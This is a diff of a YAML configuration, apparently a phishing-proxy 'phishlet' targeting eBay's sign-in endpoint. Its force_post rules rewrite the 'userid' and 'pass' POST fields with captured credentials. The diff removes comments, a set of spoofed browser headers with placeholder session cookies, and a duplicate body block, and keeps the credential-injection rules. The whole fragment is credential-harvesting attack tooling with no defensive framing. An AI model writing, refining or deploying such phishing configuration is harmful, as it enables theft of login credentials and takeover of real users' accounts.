@@ -158,29 +158,14 @@ force_post:
     path: '/ws/eBayISAPI.dll?SignIn'
     type: post
     force:
-      - key: 'userid'                     # Field name to enforce in the POST data
-        search: '.*'                      # Regex pattern to match any value in the 'userid' field
-        replace: '{{credentials.username}}' # Replace with captured username
-        value: '{{credentials.username}}'   # Set the replacement value for 'userid'
-      - key: 'pass'                       # Field name to enforce in the POST data
-        search: '.*'                      # Regex pattern to match any value in the 'pass' field
-        replace: '{{credentials.password}}' # Replace with captured password
-        value: '{{credentials.password}}'   # Set the replacement value for 'pass'
-    headers:
-      Content-Type: 'application/x-www-form-urlencoded'
-      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
-      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
-      Accept-Language: 'en-US,en;q=0.9'
-      Accept-Encoding: 'gzip, deflate, br'
-      Connection: 'keep-alive'
-      Referer: 'https://www.ebay.com/signin'
-      Origin: 'https://signin.ebay.com'
-      Dnt: '1'
-      Cookie: 's=your_session_cookie_here; dp1=your_dp1_cookie_here; npii=your_npii_cookie_here'
-      Cache-Control: 'max-age=0'
-    body:
-      - { key: 'userid', value: '{{credentials.username}}' }
-      - { key: 'pass', value: '{{credentials.password}}' }
+      - key: 'userid'
+        search: '.*'
+        replace: '{{credentials.username}}'
+        value: '{{credentials.username}}'
+      - key: 'pass'
+        search: '.*'
+        replace: '{{credentials.password}}'
+        value: '{{credentials.password}}'
 
 credentials:
   username:
